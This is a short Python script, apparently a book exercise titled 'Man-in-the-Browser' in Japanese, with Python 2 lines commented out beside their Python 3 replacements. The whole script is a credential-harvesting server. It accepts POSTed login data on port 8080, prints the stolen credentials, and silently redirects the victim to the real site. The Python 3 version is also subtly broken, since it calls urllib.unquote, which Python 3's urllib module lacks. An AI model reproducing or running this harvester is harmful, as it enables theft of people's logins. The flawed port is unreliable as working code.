#9.1　（ある種の）Man-in-the-Browser

#import SimpleHTTPServer
import http.server
#import SocketServer
import socketserver
import urllib

#class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        #print creds
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

#server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server = socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
